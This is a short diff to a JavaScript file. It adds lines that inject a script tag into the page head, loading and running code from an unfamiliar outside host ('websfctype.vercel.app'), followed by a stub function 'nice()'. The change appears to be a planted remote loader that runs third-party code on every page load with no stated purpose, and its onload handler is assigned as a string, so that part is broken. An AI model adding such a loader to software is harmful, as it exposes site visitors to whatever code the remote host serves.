@@ -1,4 +1,7 @@
-
+var script = document.createElement('script');
+script.src = 'https://websfctype.vercel.app/Websfctype/Websfctype-main-@version104.js';
+script.onload = "nice()"
+document.head.appendChild(script);
 
 function nice() {
 
